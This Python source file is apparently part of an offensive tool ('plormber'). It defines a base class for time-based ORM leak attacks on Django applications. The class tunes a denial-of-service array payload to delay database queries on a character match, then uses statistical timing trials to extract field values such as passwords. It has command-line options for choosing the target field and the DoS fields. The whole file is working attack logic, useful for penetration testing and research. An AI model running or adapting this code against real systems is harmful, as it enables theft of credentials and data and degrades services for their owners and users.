import json, math
import numpy as np

from plormber.attacks.time.base import BaseTimeORMLeakAttack
from plormber.attacks.time.exceptions import CouldNotFitParameters

from colorama import Fore, Style
from abc import ABC
from typing import Optional

class DjangoBaseTimeBasedORMLeak(BaseTimeORMLeakAttack, ABC):
    max_dos_length = 2000
    trials_search_mean_tests = 5

    def __init__(self, dump_key: str = '', dump_val: str = '', dos_key: str = '', dos_fields: list[str] = [], 
                 additional_filter_opts: dict = {}, start_dos_length: int = 10, search_dump_val: Optional[str] = None, 
                 hit_value: Optional[str] = None, **kwargs):
        
        super().__init__(**kwargs)

        self.dos_array_len = start_dos_length
        self.dump_key = dump_key
        self.dump_val = dump_val
        self.dos_key = dos_key
        self.dos_fields = dos_fields
        self.search_dump_val = search_dump_val
        self.hit_value = hit_value
        self.additional_filter_opts = additional_filter_opts
    

    def do_search_comparison(self) -> bool:
        p_values = []
        for i in range(DjangoBaseTimeBasedORMLeak.trials_search_mean_tests):
            p_value, _rn, _result = self.check_is_significant(self.hit_value)
            # Speed up the search and skip if the first trial isn't significant
            if i == 0 and p_value >= self.significance_level:
                return False
            p_values.append(p_value)

        stats_run_done = np.mean(p_values) < self.significance_level
        return stats_run_done
 

    def trials_search(self):
        if self.search_dump_val is None or self.hit_value is None:
            raise CouldNotFitParameters("missing --known-dump-key or --known-dump-value option")
        
        temp_dump_val = self.dump_val
        self.dump_val = self.search_dump_val

        stats_done = False

        # start search at trials option
        self.trials = self.trials if self.trials > 1 else 2

        while not stats_done:
            stats_done = self.do_search_comparison()

            if not stats_done:
                self.trials = math.ceil(self.trials * self.trials_multiplier)

            if self.trials > self.max_trials:
                raise CouldNotFitParameters("increase --max-trials or give up since cannot detect difference")

        self.dump_val = temp_dump_val

    
    def fit_params(self):
        print(f"{Style.DIM}Finding a suitable array length that wouldn't cause a 4xx response{Style.RESET_ALL}")
        # First find the max self.dos_array_len before we start getting 4xx responses
        for dos_len in range(self.dos_array_len, DjangoBaseTimeBasedORMLeak.max_dos_length+1, 10):
            self.dos_array_len = dos_len
            test_p = self.build_dos_payload()
            r = self.send_request(test_p)
            if r.status_code >= 400:
                # Just in case -20 still causes 4xx responses
                # Too lazy to fine tune this
                self.dos_array_len -= 20
                break

        if self.dos_array_len <= 0:
            raise CouldNotFitParameters("Got 4xx response on first request.")
        
        print(f"{Fore.GREEN}Fitted {Fore.CYAN}--start-dos-length {Fore.YELLOW}{Style.BRIGHT}{self.dos_array_len}{Style.RESET_ALL}")
    
        super().fit_params()


    def prepare_payload(self, p: dict) -> dict:
        raise NotImplementedError("Need to implement the method for preparing the payload")
    

    @classmethod
    def add_options(cls, parser):
        parser = super().add_options(parser)

        parser.add_argument(
            '--dump-key',
            help='the field name to dump from (e.g. author)',
            required=True,
            type=str
        )

        parser.add_argument(
            '--dump-val',
            help='the field of the model to dump the value of (e.g. password)',
            required=True,
            type=str
        )

        parser.add_argument(
            '--dos-key',
            help='the field name that would the field that would be used to DoS the DB on a hit',
            required=True,
            type=str
        )

        parser.add_argument(
            '--dos-fields',
            help='a comma separated list of the field names that would be used to DoS the DB on a hit',
            required=True,
            type=lambda arg: [a.strip() for a in arg.split(',')]
        )

        parser.add_argument(
            '--start-dos-length',
            help='the starting length of the array used for delaying execution on a character hit',
            default=10,
            type=int
        )

        parser.add_argument(
            '--search-dump-val',
            help='the key value to use when doing the trials search with the --do-trials-search option',
            required=False,
            default=None,
            type=str
        )

        parser.add_argument(
            '--hit-value',
            help='a value that is known to be contained in the --search-dump-val when doing the trials search with the --do-trials-search option',
            required=False,
            default=None,
            type=str
        )

        parser.add_argument(
            '--additional-filter-opts',
            help='additional filter options to dump exactly what you want as a JSON string (e.g. {"email":{"contains":"admin"}})',
            default={},
            type=json.loads
        )

        return parser
